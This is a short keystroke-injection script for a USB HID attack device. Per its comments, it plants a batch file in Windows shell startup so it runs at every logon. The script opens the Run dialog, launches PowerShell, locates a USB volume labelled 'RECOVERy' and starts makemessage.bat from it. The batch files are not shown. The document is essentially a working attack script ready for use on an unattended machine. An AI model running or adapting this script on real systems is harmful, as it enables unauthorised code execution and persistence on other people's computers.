// Uses a batch file and copies it to shell startup, does it on startup.
// The batch files are called message.bat and makemessage.bat and are located in the same folder as this script.
// Make sure you copy message.bat and makemessage.bat to your usb mass storage device.
// Also you can rename the drive in this script to yours.

layout('us'); 
typingSpeed(0,0) 
press("GUI r")
delay(200)
type("powershell\n") 
delay(2000)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'RECOVERy' } | select name \n") 
delay(200)
type("cd $usbpath.name\n")
delay(200)
type("start ./makemessage.bat")
delay(200)
press("enter")

